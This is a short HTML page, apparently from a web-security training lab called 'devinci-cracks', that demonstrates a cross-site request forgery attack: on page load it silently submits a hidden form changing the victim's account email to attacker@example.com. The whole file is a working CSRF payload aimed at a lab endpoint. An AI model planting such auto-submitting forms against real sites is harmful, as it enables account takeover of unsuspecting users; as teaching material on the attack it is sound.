<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Malicious Page</title>
    <link rel="stylesheet" href="/devinci-cracks/style/base.css" />
</head>

<body onload="document.forms['csrf-form'].submit()">
    <!-- This form simulates a CSRF attack by auto-submitting a request -->
    <form id="csrf-form" method="POST" action="/devinci-cracks/view/csrf_update.php" style="display:none;">
        <!-- For demonstration -->
        <input type="email" name="email" value="attacker@example.com">
    </form>
</body>

</html>